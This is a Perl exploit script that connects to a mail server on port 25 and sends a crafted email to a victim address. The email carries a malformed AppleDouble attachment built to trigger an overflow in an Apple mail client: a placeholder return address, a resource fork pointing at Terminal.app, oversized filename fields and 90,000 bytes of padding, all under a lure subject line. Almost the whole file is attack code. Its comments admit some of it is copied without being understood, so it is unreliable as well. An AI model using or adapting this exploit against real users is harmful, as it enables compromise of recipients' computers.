#!/usr/bin/perl

use IO::Socket;
use MIME::Base64;
$hostName = $ARGV[0];
$emailaddy = $ARGV[1];

$sock = IO::Socket::INET->new (Proto => "tcp", PeerAddr => $hostName, PeerPort => 25, Type => SOCK_STREAM);
$sock or die "no socket :$!\n"; 
print $sock "EHLO [192.168.1.7]\r\n" .
"MAIL FROM:<root>\r\n" .    
"RCPT TO:<$emailaddy>\r\n" .	      
"DATA\r\n" .
"To: Ciph3r\Ciph3r_blackhat@example.com\r\n" .
"Message-Id: <436D67E1-2FB3-4A6C-B3CD-FF8A41B0664D\www.Expl0iters.ir\r\n" .
"Content-Type: multipart/mixed; boundary=Apple-Download-3-188295813\r\n" .
"From: root <root>\r\n" .
"Subject: Dude you have to see this shit!\r\n" .
"Date: Mon, 5 oct 2008 \r\n" .
"X-Downloader: Apple Download (2.746.2)\r\n" .
"\r\n" .
"\r\n" .
"--Apple-Download-3-188295813\r\n" .
"Content-Type: multipart/appledouble;\r\n" .
"\tboundary=Apple-Download-4-188295813\r\n" .
"Content-Disposition: attachment\r\n" .
"\r\n" .
"\r\n" .
"--Apple-Download-4-188295813\r\n" .
"Content-Transfer-Encoding: base64\r\n" .
"Content-Type: application/applefile;\r\n" .
"\tname=\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\r\n" .
"Content-Disposition: attachment;\r\n" .
"\tfilename*1=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\r\n" .
"\r\n";

$retaddr = "\x41\x42\x43\x44";  # Shit the spec says printable ASCII!

$bufferz  = 

"\x00\x05\x16\x07".	# AppleDouble Magic Number
"\x00\x02\x00\x00".	# Version 2
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".	# 16 Bytes of <null> filler
"\x00\x03\x00\x00".	# Number of entries (3)
"\x00\x09\x00\x00".	# Entry ID 9 is for 'Finder Info'
"\x00\x3e\x00\x00".	# Start of Finder Info data is at file offset 0x3e
"\x00\x0a\x00\x00".	# Length of Finder Info is 0x0a or 10
"\x00\x03\x00\x00".	# Entry ID 3 is for 'Download'
"\x00\x48\x00\x00".	# Start of Download data is at file offset 0x48
"\x00\xf5\x00\x00".	# Length of Download is 0xf5 or 245
"\x00\x02\x00\x00".	# Entry ID 2 is for 'Resource Fork'
"\x01\x3d\x00\x00".	# Start of Resource Fork is at file offset 0x013d
"\x05\x3a\x00\x00".	# Length of Resource fork is 0x053a
"\x00\x00\x00\x00".	# <null> filler
"\x00\x00\x00\x00".	# <null> filler
"aa" x 109 . "0000" . "1111" .  "2222" . "$retaddr" x 1 . "3333" . "zzz.mov." .  
# No fscking clue what this is... it is stolen from MetaSploit. 
# I think its just a resource fork. 
"\x00\x01\x00\x00\x00\x05\x08\x00\x00\x04\x08\x00\x00\x00\x32\x00". 
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x04\x04\x00\x00\x00\x25\x2f\x41\x70\x70\x6c\x69".
"\x63\x61\x74\x69\x6f\x6e\x73\x2f\x55\x74\x69\x6c\x69\x74\x69\x65".
"\x73\x2f\x54\x65\x72\x6d\x69\x6e\x61\x6c\x2e\x61\x70\x70\x00\xec".
"\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec".
"\xec\xec\xff\xec\xec\xec\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1".
"\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1".
"\xe1\xe1\xff\xe1\xe1\xe1\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6".
"\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6".
"\xe6\xe6\xff\xe6\xe6\xe6\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9".
"\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9".
"\xe9\xe9\xff\xe9\xe9\xe9\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec".
"\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec".
"\xec\xec\xff\xec\xec\xec\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef".
"\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef".
"\xef\xef\xff\xef\xef\xef\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3".
"\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3".
"\xf3\xf3\xff\xf3\xf3\xf3\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6".
"\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6".
"\xf6\xf6\xff\xf6\xf6\xf6\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8".
"\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8".
"\xf8\xf8\xff\xf8\xf8\xf8\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc".
"\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc".
"\xfc\xfc\xff\xfc\xfc\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
"\xff\xff\xff\xff\xff\xff\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00".
"\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00".
"\x00\x00\xa8\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00".
"\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00".
"\x00\x00\x2a\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00".
"\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00".
"\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
"\x05\x08\x00\x00\x04\x08\x00\x00\x00\x32\x00\x5f\xd0\xac\x12\xc2".
"\x00\x00\x00\x1c\x00\x32\x00\x00\x75\x73\x72\x6f\x00\x00\x00\x0a".
"\x00\x00\xff\xff\x00\x00\x00\x00\x01\x0d\x21\x7c";

print $sock encode_base64($bufferz) .
"\r\n" .
"--Apple-Download-4-188295813\r\n" .
"Content-Transfer-Encoding: 8bit\r\n" .
"Content-Id: <436D67E1-2FB3-4A6C-B3CD-FF8A41B0664D\Remote>\r\n" .
"Content-Type: Internet Download Manager/Download;\r\n" .
"\tx-mac-type=0;\r\n" .
"\tx-unix-mode=0755;\r\n" .
"\tx-mac-creator=0;\r\n" .
"\tname=\"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD\"\r\n" .
"Content-Disposition: attachment;\r\n" .
"\tfilename*0=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE;\r\n" .
#"\r\nFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF!\r\n" .
"\r\n" . "Z" x 90000 . "\r\n" .
"--Apple-Download-4-188295813--\r\n" .
"\r\n" .
"--Apple-Download-3-188295813--\r\n" .
".\r\n";
sleep 2; 


